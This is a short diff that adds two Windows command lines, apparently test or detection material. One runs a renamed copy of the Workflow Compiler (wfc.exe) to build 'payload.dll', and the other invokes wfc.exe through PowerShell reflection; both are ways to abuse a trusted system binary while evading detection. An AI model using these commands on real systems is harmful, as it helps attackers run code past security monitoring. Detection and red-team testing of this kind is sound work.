@@ -1,0 +1,2 @@
+copy wfc.exe not_suspicious.exe && not_suspicious.exe /target:library /out:payload.dll workflow.xoml
+powershell -Command "[System.Reflection.Assembly]::LoadFile('wfc.exe').EntryPoint.Invoke($null, @(,[string[]]('/target:library', '/out:payload.dll', 'workflow.xoml')))"
